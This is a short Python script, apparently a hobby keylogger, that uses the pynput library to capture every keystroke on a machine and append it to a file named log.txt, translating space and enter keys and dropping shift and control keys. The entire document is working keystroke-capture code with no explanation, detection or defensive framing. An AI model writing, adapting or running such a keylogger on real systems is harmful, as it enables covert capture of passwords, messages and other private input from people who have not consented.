##
###

from pynput.keyboard import Listener

def wite_to_file(key):
    letter = str(key)
    letter = letter.replace("'","")

    # Key Codes
    if letter == 'Key.space':
        letter = ' '
    elif letter == 'Key.shift_r':
        letter = ''
    elif letter == 'Key.ctrl_l':
        letter = ''
    elif letter == 'Key.enter':
        letter = "\n"
    elif letter == 'Key.shift':
        letter = ''

    with open("log.txt", 'a') as f:
        f.write(letter)

with Listener(on_press=wite_to_file) as l:
    l.join()